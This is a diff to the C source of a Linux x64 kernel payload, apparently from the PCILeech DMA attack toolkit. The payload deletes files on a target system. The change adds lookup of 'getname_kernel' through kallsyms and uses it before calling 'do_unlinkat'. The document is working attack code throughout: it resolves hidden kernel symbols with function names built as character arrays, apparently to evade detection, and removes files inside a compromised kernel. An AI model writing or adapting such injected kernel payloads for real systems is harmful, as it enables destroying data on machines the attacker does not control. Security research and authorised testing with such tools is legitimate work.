@@ -1,7 +1,7 @@
 // lx64_filedelete.c : kernel code to delete files from target system.
 // Compatible with Linux x64.
 //
-// (c) Ulf Frisk, 2016
+// (c) Ulf Frisk, 2016-2021
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 // compile with:
@@ -21,6 +21,7 @@ typedef struct tdFN2 {
 typedef struct tdFN3 {
     QWORD memcpy;
     QWORD getname;
+    QWORD getname_kernel;
     QWORD do_unlinkat;
 } FN3, *PFN3;
 
@@ -35,14 +36,16 @@ BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
 
 BOOL LookupFunctions3(PKMDDATA pk, PFN3 pfn3)
 {
-    QWORD NAMES[3];
+    QWORD NAMES[4];
     CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
     CHAR str_getname[] = { 'g', 'e', 't', 'n', 'a', 'm', 'e', 0 };
+    CHAR str_getname_kernel[] = { 'g', 'e', 't', 'n', 'a', 'm', 'e', '_', 'k', 'e', 'r', 'n', 'e', 'l', 0 };
     CHAR str_do_unlinkat[] = { 'd', 'o', '_', 'u', 'n', 'l', 'i', 'n', 'k', 'a', 't', 0 };
     NAMES[0] = (QWORD)str_memcpy;
     NAMES[1] = (QWORD)str_getname;
-    NAMES[2] = (QWORD)str_do_unlinkat;
-    return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn3, 3);
+    NAMES[2] = (QWORD)str_getname_kernel;
+    NAMES[3] = (QWORD)str_do_unlinkat;
+    return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn3, 4);
 }
 
 #define AT_FDCWD       -100
@@ -53,6 +56,7 @@ VOID c_EntryPoint(PKMDDATA pk)
 	FN2 fn2;
     FN3 fn3;
 	QWORD qwResult;
+    QWORD qwFileNamePtr;
     f2 = LookupFunctions2(pk, &fn2);
     f3 = LookupFunctions3(pk, &fn3);
 	if(!f2 && !f3) {
@@ -64,9 +68,12 @@ VOID c_EntryPoint(PKMDDATA pk)
         pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
         return;
     }
-    qwResult = f2 ?
-        SysVCall(fn2.sys_unlink, pk->dataInStr) :
-        SysVCall(fn3.do_unlinkat, AT_FDCWD, SysVCall(fn3.getname, pk->dataInStr));
+    if(f2) {
+        qwResult = SysVCall(fn2.sys_unlink, pk->dataInStr);
+    } else {
+        qwFileNamePtr = SysVCall(fn3.getname_kernel ? fn3.getname_kernel : fn3.getname, pk->dataInStr);
+        qwResult = SysVCall(fn3.do_unlinkat, AT_FDCWD, qwFileNamePtr);
+    }
 	if(qwResult) {
 		pk->dataOut[0] = STATUS_FAIL_ACTION;
 		return;
